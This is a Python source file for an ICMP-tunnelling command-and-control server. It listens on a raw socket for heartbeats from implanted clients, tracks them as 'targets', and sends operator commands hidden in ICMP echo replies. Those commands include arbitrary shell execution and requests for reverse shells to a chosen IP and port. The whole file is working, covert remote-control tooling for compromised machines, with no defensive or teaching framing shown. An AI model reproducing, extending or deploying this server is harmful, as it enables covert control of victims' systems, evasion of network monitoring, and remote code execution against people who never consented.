import socket
import struct
import select
import sys
import time
from collections import defaultdict

LISTEN_IP = "0.0.0.0"  # Listen on all interfaces
ICMP_ECHO_REPLY = 0
ICMP_CODE = 0

# Track connected clients
clients = {}
current_client = None

def parse_icmp_packet(packet):
    """Extracts the identifier, sequence number and payload from ICMP packet"""
    icmp_header = packet[20:28]
    _type, _code, _checksum, identifier, seq = struct.unpack("!BBHHH", icmp_header)
    payload = packet[28:].decode("utf-8", errors="ignore").strip()
    return identifier, seq, payload

def create_icmp_reply(identifier, seq, message):
    """Create an ICMP Echo Reply packet with embedded command"""
    icmp_type = ICMP_ECHO_REPLY
    checksum_placeholder = 0
    header = struct.pack("!BBHHH", icmp_type, ICMP_CODE, checksum_placeholder, identifier, seq)
    data = message.encode("utf-8")
    full_packet = header + data
    chksum = checksum(full_packet)
    header = struct.pack("!BBHHH", icmp_type, ICMP_CODE, chksum, identifier, seq)
    return header + data

def checksum(data):
    """Calculate ICMP checksum for packet validity"""
    if len(data) % 2:
        data += b"\x00"
    checksum = 0
    for i in range(0, len(data), 2):
        part = (data[i] << 8) + data[i+1]
        checksum += part
        checksum = (checksum & 0xFFFF) + (checksum >> 16)
    return ~checksum & 0xFFFF

def display_clients():
    """Display all known clients."""
    print("\n========================= Connected Clients ==========================")
    if not clients:
        print("No clients connected.")
    else:
        for i, (client_id, info) in enumerate(clients.items(), 1):
            last_seen = time.time() - info['last_seen']
            print(f"{i}. Client ID: {client_id} | IP: {info['addr'][0]} | Last seen: {last_seen:.1f}s ago")
            if current_client and current_client == client_id:
                print(f"   >>> CURRENT TARGET <<<")
    print("======================================================================\n")

def help_menu():
    """Display available commands."""
    print("\n========================= Available Commands =========================")
    print("clients                  - List all connected clients")
    print("target <client_id>       - Select a client to send commands to")
    print("shell <port>             - Request a reverse shell (Defaults to 4444)")
    print("shell <IP_addr> <port>   - Request a reverse shell (Defaults to 4444)")
    print("CMD:<command>            - Execute a shell command on the target")
    print("exit                     - Exit the server")
    print("help                     - Show this help menu")
    print("======================================================================\n")

def main():
    """Main server functionality"""
    global current_client
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    sock.bind((LISTEN_IP, 1))
    
    print("[+] C2 Server Started")
    print("[+] Listening for connections...")
    print("[+] Type 'help' for available commands")
    
    last_cleanup = time.time()
    prompt_displayed = False
    
    while True:
        # Display prompt only once after processing input
        if not prompt_displayed:
            sys.stdout.write("c2> ")
            sys.stdout.flush()
            prompt_displayed = True
        
        # Clean up stale clients every 60 seconds
        if time.time() - last_cleanup > 60:
            stale_clients = []
            for client_id, info in clients.items():
                if time.time() - info['last_seen'] > 180:  # 3 minutes timeout
                    stale_clients.append(client_id)
            
            for client_id in stale_clients:
                print(f"\n[!] Client {client_id} timed out and removed")
                del clients[client_id]
            
            if current_client and current_client not in clients:
                current_client = None
                print("\n[!] Current target disconnected")
                # Redisplay prompt after printing messages
                sys.stdout.write("c2> ")
                sys.stdout.flush()
            
            last_cleanup = time.time()

        # Check for client messages or user input
        ready, _, _ = select.select([sock, sys.stdin], [], [], 1)
        
        # Check if there is an incoming ICMP message
        if sock in ready:
            data, addr = sock.recvfrom(2048)
            identifier, seq, payload = parse_icmp_packet(data)
            
            # Extract client ID from heartbeat
            client_id = identifier
            if payload.startswith("ALIVE:"):
                try:
                    client_id = int(payload.split(":")[1])
                except:
                    pass
            
            # Update client information
            if client_id not in clients:
                print(f"\n[+] New client connected: ID {client_id} from {addr[0]}")
                clients[client_id] = {
                    'addr': addr,
                    'seq': seq,
                    'last_seen': time.time()
                }
                if current_client is None:
                    current_client = client_id
                    print(f"[+] Automatically targeting client {client_id}")
                # Redisplay prompt after printing messages
                sys.stdout.write("c2> ")
                sys.stdout.flush()
            else:
                clients[client_id] = {
                    'addr': addr,
                    'seq': seq,
                    'last_seen': time.time()
                }
            
            if payload.startswith("ALIVE:"):
                pass  # Just a heartbeat, no need to print
            else:
                print(f"\n[+] Message from {addr[0]} (ID {client_id}): {payload}")
                # Redisplay prompt after printing messages
                sys.stdout.write("c2> ")
                sys.stdout.flush()
        
        # Check if the user entered a command
        if sys.stdin in ready:
            command = input().strip()
            prompt_displayed = False  # Reset flag to display prompt again
            
            if not command:
                continue
                
            if command.lower() == "exit":
                print("[!] Exiting server...")
                break
                
            elif command.lower() == "help":
                help_menu()
                
            elif command.lower() == "clients":
                display_clients()

            # changes targeted client to the inputted ID
            elif command.lower().startswith("target "):
                try:
                    new_target = int(command.split()[1])
                    if new_target in clients:
                        current_client = new_target
                        print(f"[+] Now targeting client {current_client}")
                    else:
                        print(f"[!] Client {new_target} not found")
                except (IndexError, ValueError):
                    print("[!] Invalid target command. Use 'target <client_id>'")
                    
            elif current_client is not None:
                # Send command to the current target
                client_info = clients[current_client]
                response_packet = create_icmp_reply(current_client, client_info['seq'], command)
                sock.sendto(response_packet, client_info['addr'])
                print(f"[+] Sent command to client {current_client}: {command}")
                
            else:
                print("[!] No target selected. Use 'clients' to list available clients and 'target <id>' to select one.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Server terminated by user")
    except Exception as e:
        print(f"\n[!] Error: {str(e)}")
